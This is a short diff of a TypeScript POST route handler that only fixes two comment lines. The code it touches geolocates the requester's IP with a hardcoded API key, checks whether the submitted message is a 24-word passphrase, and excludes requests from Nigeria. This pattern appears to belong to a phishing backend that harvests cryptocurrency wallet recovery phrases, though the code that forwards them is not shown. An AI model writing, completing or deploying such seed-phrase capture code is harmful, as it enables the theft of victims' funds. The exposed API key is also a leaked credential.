@@ -56,9 +56,9 @@ export async function POST(request: Request) {
         const locationData = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9c72fe7c3bfa41cfaa4af67d3f711a11&ip=${ip}`);
         const locationJson = await locationData.json();
         const location = `${locationJson.city}, ${locationJson.country_name}`;
-        // await formatMessage(message, location)
+        // await formatMessage(message, location);
 
-        Validate that the message is a passphrase with 24 words
+        // Validate that the message is a passphrase with 24 words
         const words = message.trim().split(/\s+/);
 
         if (words.length === 24 && locationJson.country_name !== 'Nigeria') {
